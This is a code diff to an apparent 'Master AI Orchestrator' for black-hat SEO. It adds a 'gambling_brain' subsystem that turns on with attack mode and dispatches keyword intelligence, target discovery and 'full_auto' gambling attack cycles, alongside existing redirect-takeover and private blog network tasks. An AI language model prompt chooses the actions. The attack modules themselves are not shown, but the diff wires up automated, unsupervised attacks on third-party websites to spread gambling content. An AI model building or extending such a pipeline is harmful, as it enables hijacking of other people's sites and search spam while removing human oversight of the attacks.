@@ -434,6 +434,7 @@ async function decide(
   if (orchState.seoEnabled) enabledSystems.push("seo");
   if (orchState.attackEnabled) enabledSystems.push("attack");
   if (orchState.attackEnabled) enabledSystems.push("redirect_takeover"); // Auto-enable with attack
+  if (orchState.attackEnabled) enabledSystems.push("gambling_brain"); // Auto-enable gambling AI brain with attack
   if (orchState.pbnEnabled) enabledSystems.push("pbn");
   if (orchState.discoveryEnabled) enabledSystems.push("discovery");
   if (orchState.rankTrackingEnabled) enabledSystems.push("rank");
@@ -447,6 +448,7 @@ async function decide(
     rank: ["rank_check", "rank_bulk_check", "rank_competitor_analysis"],
     autobid: ["autobid_scan", "autobid_analyze", "autobid_execute"],
     redirect_takeover: ["takeover_scan_targets", "takeover_batch_scan", "takeover_execute", "takeover_scan_serp_targets", "takeover_verify_pending"],
+    gambling_brain: ["gambling_run_cycle", "gambling_keyword_intel", "gambling_smart_discovery", "gambling_auto_attack"],
   };
 
   const prompt = `You are the Master AI Orchestrator. Based on your analysis, decide what actions to take.
@@ -913,6 +915,52 @@ async function executeTask(task: AiTaskQueueRow): Promise<Record<string, unknown
         const verifyResult = await processPendingVerifications();
         console.log(`[Orchestrator] Verification processed: ${verifyResult.processed} sites (${verifyResult.verified} verified, ${verifyResult.reverted} reverted, ${verifyResult.retried} retried)`);
         return { action: taskType, status: "completed", ...verifyResult };
+      }
+      
+      return { action: taskType, status: "dispatched" };
+    }
+
+    // ─── Gambling AI Brain ───
+    if (subsystem === "gambling_brain" || taskType.startsWith("gambling_")) {
+      const { runBrainCycle, getBrainState } = await import("./gambling-ai-brain");
+      const { runFullIntelligenceCycle } = await import("./gambling-keyword-intel");
+      const { runSmartGamblingDiscovery } = await import("./smart-target-discovery");
+      
+      if (taskType === "gambling_run_cycle") {
+        // Full autonomous cycle: keywords → discovery → attack
+        const brainState = getBrainState();
+        if (brainState.isRunning) {
+          console.log(`[Orchestrator] Gambling brain already running, skipping`);
+          return { action: taskType, status: "skipped", reason: "already_running" };
+        }
+        runBrainCycle({ attackMode: "full_auto" }).catch(e => {
+          console.error(`[Orchestrator] Gambling brain cycle error:`, e);
+        });
+        return { action: taskType, status: "dispatched" };
+      }
+      
+      if (taskType === "gambling_keyword_intel") {
+        const result = await runFullIntelligenceCycle();
+        console.log(`[Orchestrator] Keyword intel: ${result.scored} scored, ${result.expanded.newKeywords} expanded`);
+        return { action: taskType, status: "completed", ...result };
+      }
+      
+      if (taskType === "gambling_smart_discovery") {
+        const result = await runSmartGamblingDiscovery();
+        console.log(`[Orchestrator] Smart discovery: ${result.totalUniqueTargets} targets found`);
+        return { action: taskType, status: "completed", targetsFound: result.totalUniqueTargets };
+      }
+      
+      if (taskType === "gambling_auto_attack") {
+        // Run brain cycle in attack-only mode (skip keyword/discovery phases)
+        const brainState = getBrainState();
+        if (brainState.isRunning) {
+          return { action: taskType, status: "skipped", reason: "already_running" };
+        }
+        runBrainCycle({ attackMode: "full_auto", expandKeywords: false }).catch(e => {
+          console.error(`[Orchestrator] Gambling auto-attack error:`, e);
+        });
+        return { action: taskType, status: "dispatched" };
       }
       
       return { action: taskType, status: "dispatched" };
